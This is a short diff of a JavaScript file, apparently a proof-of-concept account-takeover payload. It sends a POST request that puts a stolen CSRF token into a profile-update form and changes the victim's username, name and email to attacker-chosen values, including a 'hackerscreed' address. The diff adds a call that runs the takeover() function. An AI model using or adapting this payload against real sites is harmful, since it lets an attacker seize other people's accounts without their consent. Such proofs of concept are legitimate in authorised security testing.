@@ -16,3 +16,5 @@ xhttp.open("POST", url, true);
 xhttp.send("username=imran1121&fname=imran&lname=parray&email=hackerscreed1122211%40gmail.com&url=https%3A%2F%2Fgoogle.com&current_password=&password=&confirm_password=&__csrf_token="+csrf_token+"&__fallback__=true&sec_type=undefined&sec_answer=undefined");
 
 }
+
+takeover();
